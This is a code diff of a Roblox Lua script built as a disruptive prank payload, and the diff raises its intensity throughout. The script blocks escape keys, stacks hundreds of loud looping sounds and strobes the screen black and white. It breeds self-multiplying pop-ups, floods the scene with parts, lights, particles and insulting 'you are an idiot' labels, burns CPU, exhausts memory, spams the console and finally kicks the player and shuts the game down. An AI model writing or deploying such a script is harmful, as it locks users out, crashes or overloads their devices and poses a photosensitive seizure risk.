@@ -36,6 +36,11 @@ local function mount(gui)
     end
 end
 
+local function getBase()
+    local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    return root and root.Position or Vector3.new(0, 5, 0)
+end
+
 local blockedKeys = {
     [Enum.KeyCode.Escape] = true,
     [Enum.KeyCode.Return] = true,
@@ -82,7 +87,7 @@ task.spawn(function()
     end
 end)
 
-task.delay(300, function()
+task.delay(3600, function()
     pcall(function() player:Kick("gg") end)
     task.wait(0.5)
     pcall(function() game:Shutdown() end)
@@ -123,15 +128,13 @@ mount(blackGui)
 
 local blackFrame = Instance.new("Frame")
 blackFrame.Size = UDim2.fromScale(1, 1)
-blackFrame.Position = UDim2.fromScale(0, 0)
 blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-blackFrame.BackgroundTransparency = 0
 blackFrame.BorderSizePixel = 0
 blackFrame.ZIndex = 1
 blackFrame.Parent = blackGui
 
 local SOUND_ID = "rbxassetid://131761138083978"
-local MAX_SOUNDS = 200
+local MAX_SOUNDS = 500
 local sounds = {}
 
 local function addSound(clean)
@@ -140,21 +143,13 @@ local function addSound(clean)
     s.SoundId = SOUND_ID
     s.Looped = true
     s.Volume = 10
-    if clean then
-        s.PlaybackSpeed = 1.0
-    else
-        s.PlaybackSpeed = 0.55 + math.random() * 1.1
-    end
+    s.PlaybackSpeed = clean and 1.0 or (0.4 + math.random() * 1.4)
     s.Parent = SoundService
     pcall(function()
         s:Play()
         if not clean then
             local len = s.TimeLength
-            if len and len > 0 then
-                s.TimePosition = math.random() * len
-            else
-                s.TimePosition = math.random() * 5
-            end
+            s.TimePosition = (len and len > 0) and (math.random() * len) or (math.random() * 5)
         end
     end)
     sounds[#sounds + 1] = s
@@ -168,26 +163,22 @@ task.spawn(function()
     while true do
         task.wait(interval)
         addSound(false)
-        interval = math.max(0.075, interval * 0.94)
+        interval = math.max(0.02, interval * 0.9)
     end
 end)
 
 task.spawn(function()
-    task.wait(7.5)
+    task.wait(5)
     while true do
-        task.wait(0.75)
+        task.wait(0.15)
         if #sounds >= 5 then
-            for _ = 1, math.min(2, #sounds) do
+            for _ = 1, math.min(6, #sounds) do
                 local s = sounds[math.random(1, #sounds)]
                 if s and s.Parent then
                     pcall(function()
                         local len = s.TimeLength
-                        if len and len > 0 then
-                            s.TimePosition = math.random() * len
-                        end
-                        if math.random() < 0.35 then
-                            s.PlaybackSpeed = 0.55 + math.random() * 1.1
-                        end
+                        if len and len > 0 then s.TimePosition = math.random() * len end
+                        if math.random() < 0.5 then s.PlaybackSpeed = 0.4 + math.random() * 1.4 end
                     end)
                 end
             end
@@ -197,13 +188,13 @@ end)
 
 task.spawn(function()
     while true do
-        task.wait(0.4)
+        task.wait(0.1)
         pcall(function()
             local s = Instance.new("Sound")
             s.SoundId = SOUND_ID
             s.Looped = true
             s.Volume = 10
-            s.PlaybackSpeed = 0.4 + math.random() * 1.4
+            s.PlaybackSpeed = 0.3 + math.random() * 1.6
             s.Parent = SoundService
             s:Play()
         end)
@@ -219,10 +210,8 @@ RunService.Heartbeat:Connect(function(dt)
     if timer < 0.35 then return end
     timer = 0
     isBlack = not isBlack
-
     local bg = isBlack and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)
     local fg = isBlack and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(0, 0, 0)
-
     for data in pairs(pages) do
         if data.page and data.page.Parent then
             data.page.BackgroundColor3 = bg
@@ -237,7 +226,6 @@ RunService.Heartbeat:Connect(function(dt)
 end)
 
 local count = 0
-
 local function spawnPopup()
     count += 1
     local id = count
@@ -353,16 +341,12 @@ local function spawnPopup()
             pages[data] = nil
             return
         end
-
         px += vx * dt
         py += vy * dt
-
         if px <= 0 then px = 0; vx = math.abs(vx)
         elseif px + w >= sw then px = sw - w; vx = -math.abs(vx) end
-
         if py <= 0 then py = 0; vy = math.abs(vy)
         elseif py + h >= sh then py = sh - h; vy = -math.abs(vy) end
-
         window.Position = UDim2.new(0, px, 0, py)
     end)
 
@@ -370,53 +354,178 @@ local function spawnPopup()
         conn:Disconnect()
         pages[data] = nil
         gui:Destroy()
-        task.spawn(spawnPopup)
-        task.spawn(spawnPopup)
-        task.spawn(spawnPopup)
+        for _ = 1, 6 do task.spawn(spawnPopup) end
     end)
 end
 
 spawnPopup()
-for i = 1, 8 do
-    task.delay(i * 0.1, spawnPopup)
-end
+for i = 1, 20 do task.delay(i * 0.05, spawnPopup) end
 
 task.spawn(function()
     local interval = 0.25
     while true do
         task.wait(interval)
-        spawnPopup()
-        interval = math.max(0.02, interval * 0.94)
+        for _ = 1, 3 do task.spawn(spawnPopup) end
+        interval = math.max(0.01, interval * 0.9)
     end
 end)
 
 task.spawn(function()
     while true do
-        for _ = 1, 5 do task.spawn(spawnPopup) end
-        task.wait(0.04)
+        RunService.Heartbeat:Wait()
+        for _ = 1, 4 do task.spawn(spawnPopup) end
+    end
+end)
+
+local WORK_PARENT = Instance.new("Folder")
+WORK_PARENT.Name = "M7_LAG"
+WORK_PARENT.Parent = workspace
+
+local ALL_PARTS = {}
+
+RunService.Heartbeat:Connect(function()
+    local ops = 0
+    local cframe = CFrame.new()
+    for _ = 1, 800000 do
+        cframe = cframe * CFrame.Angles(math.random(), math.random(), math.random())
+        ops = ops + 1
+    end
+end)
+
+RunService.Heartbeat:Connect(function()
+    local n = #ALL_PARTS
+    if n == 0 then return end
+    local limit = math.min(n, 3000)
+    for i = 1, limit do
+        local p = ALL_PARTS[math.random(1, n)]
+        if p and p.Parent then
+            pcall(function()
+                p.CFrame = p.CFrame * CFrame.Angles(math.random() * 0.1, math.random() * 0.1, math.random() * 0.1)
+                p.Color = Color3.new(math.random(), math.random(), math.random())
+            end)
+        end
+    end
+end)
+
+task.spawn(function()
+    while true do
+        RunService.Heartbeat:Wait()
+        local basePos = getBase()
+        for _ = 1, 40 do
+            pcall(function()
+                local p = Instance.new("Part")
+                p.Size = Vector3.new(math.random(2,6), math.random(2,6), math.random(2,6))
+                p.Material = Enum.Material.Metal
+                p.CanCollide = true
+                p.Anchored = false
+                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-60,60), math.random(80,200), math.random(-60,60)))
+                local a0 = Instance.new("Attachment", p); a0.Position = Vector3.new(0,1,0)
+                local a1 = Instance.new("Attachment", p); a1.Position = Vector3.new(0,-1,0)
+                local t = Instance.new("Trail")
+                t.Attachment0 = a0; t.Attachment1 = a1; t.Lifetime = 10
+                t.MinLength = 0; t.WidthScale = NumberSequence.new(3)
+                t.Parent = p
+                p.Parent = WORK_PARENT
+                table.insert(ALL_PARTS, p)
+            end)
+        end
+    end
+end)
+
+task.spawn(function()
+    while true do
+        task.wait(1.5)
+        local basePos = getBase()
+        local chain = {}
+        for i = 1, 60 do
+            pcall(function()
+                local p = Instance.new("Part")
+                p.Size = Vector3.new(2, 1, 2)
+                p.Material = Enum.Material.Slate
+                p.CanCollide = true
+                p.Anchored = false
+                p.CFrame = CFrame.new(basePos + Vector3.new(i * 2, 80 + i * 3, 0))
+                p.Parent = WORK_PARENT
+                table.insert(ALL_PARTS, p)
+                if #chain > 0 then
+                    local prev = chain[#chain]
+                    local a0 = Instance.new("Attachment", prev); a0.Position = Vector3.new(0, -0.5, 0)
+                    local a1 = Instance.new("Attachment", p); a1.Position = Vector3.new(0, 0.5, 0)
+                    local bs = Instance.new("BallSocketConstraint")
+                    bs.Attachment0 = a0
+                    bs.Attachment1 = a1
+                    bs.LimitsEnabled = true
+                    bs.UpperAngle = 45
+                    bs.TwistLimitsEnabled = true
+                    bs.Parent = prev
+                end
+                table.insert(chain, p)
+            end)
+        end
+    end
+end)
+
+task.spawn(function()
+    while true do
+        RunService.Heartbeat:Wait()
+        local basePos = getBase()
+        for _ = 1, 12 do
+            pcall(function()
+                local ex = Instance.new("Explosion")
+                ex.BlastRadius = 0
+                ex.BlastPressure = 0
+                ex.DestroyJointRadiusPercent = 0
+                ex.Position = basePos + Vector3.new(math.random(-40,40), math.random(-10,20), math.random(-40,40))
+                ex.Parent = workspace
+            end)
+        end
+    end
+end)
+
+task.spawn(function()
+    while true do
+        task.wait(0.1)
+        local basePos = getBase()
+        for _ = 1, 50 do
+            pcall(function()
+                local p = Instance.new("Part")
+                p.Size = Vector3.new(math.random(3,12), math.random(3,12), math.random(3,12))
+                p.Material = Enum.Material.Neon
+                p.Color = Color3.new(math.random(), math.random(), math.random())
+                p.Transparency = 0.2
+                p.CanCollide = false
+                p.Anchored = true
+                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-80,80), math.random(0,80), math.random(-80,80)))
+                    * CFrame.Angles(math.random()*6.28, math.random()*6.28, math.random()*6.28)
+                p.Parent = WORK_PARENT
+                table.insert(ALL_PARTS, p)
+            end)
+        end
     end
 end)
 
 task.spawn(function()
     local wave = 1
     while true do
-        task.wait(0.5)
-        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-        local basePos = root and root.Position or Vector3.new(0, 5, 0)
-        local emitterCount = math.min(wave * 6, 400)
-        local lightCount = math.min(wave * 3, 200)
+        task.wait(0.3)
+        local basePos = getBase()
+        local emitterCount = math.min(wave * 12, 1200)
+        local lightCount = math.min(wave * 6, 500)
         for _ = 1, emitterCount do
             pcall(function()
                 local p = Instance.new("Part")
                 p.Size = Vector3.new(0.2, 0.2, 0.2); p.Transparency = 1
                 p.CanCollide = false; p.Anchored = true
-                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-80,80), math.random(0,60), math.random(-80,80)))
+                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-120,120), math.random(0,100), math.random(-120,120)))
                 local em = Instance.new("ParticleEmitter")
-                em.Rate = 1500; em.Lifetime = NumberRange.new(20, 40)
-                em.Size = NumberSequence.new(25)
+                em.Rate = 3000
+                em.Lifetime = NumberRange.new(30, 60)
+                em.Size = NumberSequence.new(35)
                 em.Texture = "rbxasset://textures/particles/sparkles_main.dds"
-                em.LightEmission = 1; em.LightInfluence = 0
-                em.Parent = p; p.Parent = workspace
+                em.LightEmission = 1
+                em.Parent = p
+                p.Parent = WORK_PARENT
+                table.insert(ALL_PARTS, p)
             end)
         end
         for _ = 1, lightCount do
@@ -424,45 +533,41 @@ task.spawn(function()
                 local p = Instance.new("Part")
                 p.Size = Vector3.new(1,1,1); p.Transparency = 1
                 p.CanCollide = false; p.Anchored = true
-                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-80,80), math.random(0,50), math.random(-80,80)))
+                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-120,120), math.random(0,80), math.random(-120,120)))
                 local l = Instance.new("PointLight")
-                l.Range = 80; l.Brightness = 12; l.Shadows = true
-                l.Parent = p; p.Parent = workspace
+                l.Range = 100; l.Brightness = 15; l.Shadows = true
+                l.Color = Color3.new(math.random(), math.random(), math.random())
+                l.Parent = p
+                p.Parent = WORK_PARENT
+                table.insert(ALL_PARTS, p)
             end)
         end
-        wave = wave + 2
+        wave = wave + 3
     end
 end)
 
 task.spawn(function()
     while true do
-        task.wait(0.05)
-        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-        local basePos = root and root.Position or Vector3.new(0, 5, 0)
-        for _ = 1, 10 do
-            pcall(function()
-                local p = Instance.new("Part")
-                p.Size = Vector3.new(4,4,4); p.Material = Enum.Material.Metal
-                p.CanCollide = true; p.Anchored = false
-                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-40,40), math.random(60,120), math.random(-40,40)))
-                local a0 = Instance.new("Attachment", p); a0.Position = Vector3.new(0,1,0)
-                local a1 = Instance.new("Attachment", p); a1.Position = Vector3.new(0,-1,0)
-                local t = Instance.new("Trail")
-                t.Attachment0 = a0; t.Attachment1 = a1; t.Lifetime = 8
-                t.MinLength = 0; t.WidthScale = NumberSequence.new(2)
-                t.Parent = p
-                p.Parent = workspace
-            end)
-        end
+        task.wait(0.5)
+        pcall(function()
+            local basePos = getBase()
+            local region = Region3.new(
+                basePos - Vector3.new(60, 30, 60),
+                basePos + Vector3.new(60, 30, 60)
+            ):ExpandToGrid(4)
+            local mat = ({Enum.Material.Grass, Enum.Material.Sand, Enum.Material.Rock,
+                          Enum.Material.Snow, Enum.Material.Water, Enum.Material.Slate})[math.random(1, 6)]
+            workspace.Terrain:FillRegion(region, 4, mat)
+        end)
     end
 end)
 
 task.spawn(function()
     local effects = {}
-    for _ = 1, 12 do
+    for _ = 1, 40 do
         local cc = Instance.new("ColorCorrectionEffect"); cc.Parent = Lighting; table.insert(effects, cc)
-        local bl = Instance.new("BlurEffect"); bl.Size = 20; bl.Parent = Lighting; table.insert(effects, bl)
-        local bm = Instance.new("BloomEffect"); bm.Intensity = 2; bm.Threshold = 0.1; bm.Size = 24; bm.Parent = Lighting; table.insert(effects, bm)
+        local bl = Instance.new("BlurEffect"); bl.Size = 30; bl.Parent = Lighting; table.insert(effects, bl)
+        local bm = Instance.new("BloomEffect"); bm.Intensity = 4; bm.Threshold = 0.1; bm.Size = 32; bm.Parent = Lighting; table.insert(effects, bm)
     end
     RunService.RenderStepped:Connect(function()
         for _, e in ipairs(effects) do
@@ -473,73 +578,21 @@ task.spawn(function()
             elseif e:IsA("BlurEffect") then
                 e.Size = math.random() * 56
             elseif e:IsA("BloomEffect") then
-                e.Intensity = math.random() * 5
+                e.Intensity = math.random() * 8
+                e.Threshold = math.random() * 0.5
             end
         end
     end)
 end)
 
-task.spawn(function()
-    while true do
-        task.wait(0.08)
-        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-        local basePos = root and root.Position or Vector3.new(0, 5, 0)
-        for _ = 1, 6 do
-            pcall(function()
-                local ex = Instance.new("Explosion")
-                ex.BlastRadius = 0; ex.BlastPressure = 0; ex.DestroyJointRadiusPercent = 0
-                ex.Position = basePos + Vector3.new(math.random(-30,30), math.random(-10,20), math.random(-30,30))
-                ex.Parent = workspace
-            end)
-        end
-    end
-end)
-
 RunService.RenderStepped:Connect(function()
     local cam = workspace.CurrentCamera
-    if cam then
-        pcall(function() cam.FieldOfView = 30 + math.random() * 90 end)
-    end
-end)
-
-task.spawn(function()
-    while true do
-        local t = {}
-        for i = 1, 100000 do
-            t[i] = { math.random(), math.random(), tostring(math.random()) }
-        end
-        task.wait(0.05)
-    end
-end)
-
-task.spawn(function()
-    while true do
-        for _ = 1, 200 do
-            print(string.rep(tostring(math.random()), 30))
-        end
-        task.wait(0.01)
-    end
-end)
-
-task.spawn(function()
-    while true do
-        task.wait(0.1)
-        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-        local basePos = root and root.Position or Vector3.new(0, 5, 0)
-        for _ = 1, 20 do
-            pcall(function()
-                local p = Instance.new("Part")
-                p.Size = Vector3.new(math.random(2,10), math.random(2,10), math.random(2,10))
-                p.Material = Enum.Material.Neon
-                p.Color = Color3.new(math.random(), math.random(), math.random())
-                p.Transparency = 0.3
-                p.CanCollide = false; p.Anchored = true
-                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-50,50), math.random(0,50), math.random(-50,50)))
-                    * CFrame.Angles(math.random()*6.28, math.random()*6.28, math.random()*6.28)
-                p.Parent = workspace
-            end)
-        end
-    end
+    if not cam then return end
+    pcall(function()
+        cam.FieldOfView = 20 + math.random() * 100
+        cam.CFrame = cam.CFrame * CFrame.new(math.random()*4-2, math.random()*4-2, math.random()*4-2)
+            * CFrame.Angles(math.random()*0.2-0.1, math.random()*0.2-0.1, math.random()*0.2-0.1)
+    end)
 end)
 
 task.spawn(function()
@@ -550,11 +603,11 @@ task.spawn(function()
     gui.DisplayOrder = 999997
     mount(gui)
     local layers = {}
-    for i = 1, 80 do
+    for i = 1, 250 do
         local f = Instance.new("Frame")
         f.Size = UDim2.fromScale(1, 1)
         f.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
-        f.BackgroundTransparency = 0.85
+        f.BackgroundTransparency = 0.9
         f.BorderSizePixel = 0
         f.ZIndex = i
         f.Parent = gui
@@ -563,27 +616,27 @@ task.spawn(function()
     RunService.RenderStepped:Connect(function()
         for _, f in ipairs(layers) do
             f.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
-            f.BackgroundTransparency = 0.75 + math.random() * 0.2
+            f.BackgroundTransparency = 0.7 + math.random() * 0.25
         end
     end)
 end)
 
 task.spawn(function()
     while true do
-        task.wait(1)
+        task.wait(0.3)
         pcall(function()
             local cam = workspace.CurrentCamera
             if not cam then return end
             local att = Instance.new("Attachment")
-            att.Position = Vector3.new(math.random(-8,8), math.random(-4,4), -20)
+            att.Position = Vector3.new(math.random(-10,10), math.random(-6,6), -15)
             att.Parent = cam
             local em = Instance.new("ParticleEmitter")
-            em.Rate = 2500
-            em.Lifetime = NumberRange.new(3, 8)
-            em.Size = NumberSequence.new(40)
+            em.Rate = 4000
+            em.Lifetime = NumberRange.new(4, 10)
+            em.Size = NumberSequence.new(50)
             em.Texture = "rbxasset://textures/particles/smoke_main.dds"
-            em.LightEmission = 0.6
-            em.Transparency = NumberSequence.new(0.4)
+            em.LightEmission = 0.8
+            em.Transparency = NumberSequence.new(0.3)
             em.Parent = att
         end)
     end
@@ -591,21 +644,22 @@ end)
 
 task.spawn(function()
     while true do
-        task.wait(0.25)
-        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-        local basePos = root and root.Position or Vector3.new(0,5,0)
-        for _ = 1, 6 do
+        task.wait(0.15)
+        local basePos = getBase()
+        for _ = 1, 15 do
             pcall(function()
                 local p = Instance.new("Part")
                 p.Size = Vector3.new(1,1,1); p.Transparency = 1
                 p.CanCollide = false; p.Anchored = true
-                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-40,40), math.random(10,30), math.random(-40,40)))
+                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-60,60), math.random(15,50), math.random(-60,60)))
                     * CFrame.Angles(math.random()*6.28, math.random()*6.28, math.random()*6.28)
                 local l = Instance.new("SpotLight")
-                l.Range = 60; l.Brightness = 15; l.Angle = 120
+                l.Range = 80; l.Brightness = 20; l.Angle = 140
                 l.Shadows = true
                 l.Color = Color3.new(math.random(), math.random(), math.random())
-                l.Parent = p; p.Parent = workspace
+                l.Parent = p
+                p.Parent = WORK_PARENT
+                table.insert(ALL_PARTS, p)
             end)
         end
     end
@@ -614,9 +668,7 @@ end)
 task.spawn(function()
     pcall(function()
         local atm = Instance.new("Atmosphere")
-        atm.Density = 0.6; atm.Haze = 8; atm.Glare = 3
-        atm.Color = Color3.new(math.random(), math.random(), math.random())
-        atm.Decay = Color3.new(math.random(), math.random(), math.random())
+        atm.Density = 0.7; atm.Haze = 10; atm.Glare = 5
         atm.Parent = Lighting
 
         local sr = Instance.new("SunRaysEffect")
@@ -629,32 +681,36 @@ task.spawn(function()
         dof.Parent = Lighting
 
         RunService.RenderStepped:Connect(function()
-            atm.Density = 0.3 + math.random() * 0.5
-            atm.Haze = math.random() * 10
-            atm.Glare = math.random() * 5
-            dof.FocusDistance = math.random() * 500
+            atm.Density = 0.3 + math.random() * 0.6
+            atm.Haze = math.random() * 12
+            atm.Glare = math.random() * 6
+            atm.Color = Color3.new(math.random(), math.random(), math.random())
+            atm.Decay = Color3.new(math.random(), math.random(), math.random())
+            dof.FocusDistance = math.random() * 800
             dof.NearIntensity = math.random()
             dof.FarIntensity = math.random()
+            sr.Intensity = 0.5 + math.random() * 1.5
+            sr.Spread = math.random()
         end)
     end)
 end)
 
 task.spawn(function()
     while true do
-        task.wait(0.2)
-        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-        local basePos = root and root.Position or Vector3.new(0,5,0)
-        for _ = 1, 5 do
+        task.wait(0.15)
+        local basePos = getBase()
+        for _ = 1, 12 do
             pcall(function()
                 local p = Instance.new("Part")
-                p.Size = Vector3.new(20, 20, 1)
+                p.Size = Vector3.new(30, 30, 1)
                 p.Material = Enum.Material.Glass
                 p.Reflectance = 1
-                p.Transparency = 0.1
+                p.Transparency = 0.05
                 p.CanCollide = false; p.Anchored = true
-                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-40,40), math.random(5,30), math.random(-40,40)))
+                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-60,60), math.random(5,40), math.random(-60,60)))
                     * CFrame.Angles(math.random()*6.28, math.random()*6.28, math.random()*6.28)
-                p.Parent = workspace
+                p.Parent = WORK_PARENT
+                table.insert(ALL_PARTS, p)
             end)
         end
     end
@@ -662,35 +718,36 @@ end)
 
 task.spawn(function()
     while true do
-        task.wait(0.12)
-        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-        local basePos = root and root.Position or Vector3.new(0,5,0)
-        for _ = 1, 8 do
+        task.wait(0.08)
+        local basePos = getBase()
+        for _ = 1, 20 do
             pcall(function()
                 local p1 = Instance.new("Part")
                 p1.Size = Vector3.new(0.2,0.2,0.2); p1.Transparency = 1
                 p1.CanCollide = false; p1.Anchored = true
-                p1.CFrame = CFrame.new(basePos + Vector3.new(math.random(-60,60), math.random(0,30), math.random(-60,60)))
-                p1.Parent = workspace
+                p1.CFrame = CFrame.new(basePos + Vector3.new(math.random(-80,80), math.random(0,50), math.random(-80,80)))
+                p1.Parent = WORK_PARENT
 
                 local p2 = Instance.new("Part")
                 p2.Size = Vector3.new(0.2,0.2,0.2); p2.Transparency = 1
                 p2.CanCollide = false; p2.Anchored = true
-                p2.CFrame = CFrame.new(basePos + Vector3.new(math.random(-60,60), math.random(0,30), math.random(-60,60)))
-                p2.Parent = workspace
+                p2.CFrame = CFrame.new(basePos + Vector3.new(math.random(-80,80), math.random(0,50), math.random(-80,80)))
+                p2.Parent = WORK_PARENT
 
                 local a1 = Instance.new("Attachment", p1)
                 local a2 = Instance.new("Attachment", p2)
                 local b = Instance.new("Beam")
                 b.Attachment0 = a1; b.Attachment1 = a2
-                b.Width0 = 4; b.Width1 = 4
-                b.Segments = 30
+                b.Width0 = 6; b.Width1 = 6
+                b.Segments = 60
                 b.Texture = "rbxasset://textures/particles/sparkles_main.dds"
-                b.TextureLength = 2
-                b.TextureSpeed = 5
+                b.TextureLength = 1
+                b.TextureSpeed = 10
                 b.LightEmission = 1
                 b.Color = ColorSequence.new(Color3.new(math.random(), math.random(), math.random()))
                 b.Parent = p1
+                table.insert(ALL_PARTS, p1)
+                table.insert(ALL_PARTS, p2)
             end)
         end
     end
@@ -698,18 +755,18 @@ end)
 
 task.spawn(function()
     while true do
-        task.wait(0.15)
-        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-        local basePos = root and root.Position or Vector3.new(0,5,0)
-        for _ = 1, 6 do
+        task.wait(0.1)
+        local basePos = getBase()
+        for _ = 1, 15 do
             pcall(function()
                 local p = Instance.new("Part")
-                p.Size = Vector3.new(math.random(5,15), math.random(5,15), math.random(5,15))
+                p.Size = Vector3.new(math.random(6,18), math.random(6,18), math.random(6,18))
                 p.Material = Enum.Material.ForceField
                 p.Color = Color3.new(math.random(), math.random(), math.random())
                 p.CanCollide = false; p.Anchored = true
-                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-60,60), math.random(0,40), math.random(-60,60)))
-                p.Parent = workspace
+                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-80,80), math.random(0,60), math.random(-80,80)))
+                p.Parent = WORK_PARENT
+                table.insert(ALL_PARTS, p)
             end)
         end
     end
@@ -717,9 +774,9 @@ end)
 
 task.spawn(function()
     local blurs = {}
-    for _ = 1, 8 do
+    for _ = 1, 25 do
         local bl = Instance.new("BlurEffect")
-        bl.Size = 40
+        bl.Size = 50
         bl.Parent = Lighting
         table.insert(blurs, bl)
     end
@@ -728,4 +785,66 @@ task.spawn(function()
             bl.Size = math.random() * 56
         end
     end)
+end)
+
+task.spawn(function()
+    while true do
+        task.wait(0.5)
+        local basePos = getBase()
+        for _ = 1, 30 do
+            pcall(function()
+                local p = Instance.new("Part")
+                p.Size = Vector3.new(1,1,1); p.Transparency = 1
+                p.CanCollide = false; p.Anchored = true
+                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-100,100), math.random(0,50), math.random(-100,100)))
+                p.Parent = WORK_PARENT
+                local bb = Instance.new("BillboardGui")
+                bb.Size = UDim2.new(0, 200, 0, 60)
+                bb.AlwaysOnTop = true
+                bb.Parent = p
+                local t = Instance.new("TextLabel")
+                t.Size = UDim2.fromScale(1, 1)
+                t.BackgroundTransparency = 0
+                t.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
+                t.Text = "you are an idiot"
+                t.TextColor3 = Color3.new(math.random(), math.random(), math.random())
+                t.Font = Enum.Font.GothamBold
+                t.TextScaled = true
+                t.Parent = bb
+                task.spawn(function()
+                    while p.Parent do
+                        RunService.RenderStepped:Wait()
+                        t.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
+                        t.TextColor3 = Color3.new(math.random(), math.random(), math.random())
+                        t.Text = string.rep("idiot ", math.random(1, 5))
+                    end
+                end)
+                table.insert(ALL_PARTS, p)
+            end)
+        end
+    end
+end)
+
+local HELD_TABLES = {}
+task.spawn(function()
+    while true do
+        local t = table.create(200000)
+        for i = 1, 200000 do
+            t[i] = { math.random(), math.random(), tostring(math.random()) .. string.rep("x", 20) }
+        end
+        table.insert(HELD_TABLES, t)
+        if #HELD_TABLES > 30 then
+            table.remove(HELD_TABLES, 1)
+        end
+        task.wait(0.1)
+    end
+end)
+
+task.spawn(function()
+    while true do
+        for _ = 1, 500 do
+            print(string.rep(tostring(math.random()), 60))
+        end
+        task.wait(0.005)
+    end
 end)
